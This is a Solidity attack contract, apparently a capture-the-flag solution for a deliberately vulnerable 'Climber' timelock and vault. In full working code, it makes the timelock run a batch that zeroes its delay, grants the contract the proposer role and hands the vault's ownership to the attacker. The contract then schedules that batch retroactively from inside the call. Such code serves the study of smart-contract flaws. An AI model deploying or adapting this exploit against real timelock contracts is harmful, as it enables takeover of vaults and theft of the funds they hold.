// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ClimberTimelock} from './ClimberTimelock.sol';
import {OwnableUpgradeable} from '@openzeppelin/contracts-upgradeable/access/OwnableUpgradeable.sol';
import {AccessControl} from '@openzeppelin/contracts/access/AccessControl.sol';
import {console} from 'hardhat/console.sol';

contract ClimberAttacker {
    address private timelock;
    address private vault;
    address private player;
    bytes[] private _dataElements;

    constructor(address _timelock, address _vault) {
        timelock = _timelock;
        vault = _vault;
        player = msg.sender;
    }

    function getOwnership() public {
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);
        // 1. setup DELAY to 0
        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0);

        // 2. grant PROPOSER_ROLE to this contract
        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSelector(AccessControl.grantRole.selector, keccak256('PROPOSER_ROLE'), address(this));

        // 3. transferOwnership of valut to this player
        targets[2] = address(vault);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSelector(OwnableUpgradeable.transferOwnership.selector, player);

        // 4. schedule execute
        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSelector(ClimberAttacker.execute.selector);

        ClimberTimelock(payable(timelock)).execute(targets, values, dataElements, 0);
    }

    function execute() external {
        console.log('execute schedule');
        address[] memory targets = new address[](4);
        uint256[] memory values = new uint256[](4);
        bytes[] memory dataElements = new bytes[](4);
        // 1. setup DELAY to 0
        targets[0] = address(timelock);
        values[0] = 0;
        dataElements[0] = abi.encodeWithSelector(ClimberTimelock.updateDelay.selector, 0);

        // 2. grant PROPOSER_ROLE to this contract
        targets[1] = address(timelock);
        values[1] = 0;
        dataElements[1] = abi.encodeWithSelector(AccessControl.grantRole.selector, keccak256('PROPOSER_ROLE'), address(this));

        // 3. transferOwnership of valut to this player
        targets[2] = address(vault);
        values[2] = 0;
        dataElements[2] = abi.encodeWithSelector(OwnableUpgradeable.transferOwnership.selector, player);

        // 4. schedule execute
        targets[3] = address(this);
        values[3] = 0;
        dataElements[3] = abi.encodeWithSelector(ClimberAttacker.execute.selector);

        ClimberTimelock(payable(timelock)).schedule(targets, values, dataElements, 0);
        console.log('scheduled');
    }

    receive() external payable {}

    fallback() external payable {}
}
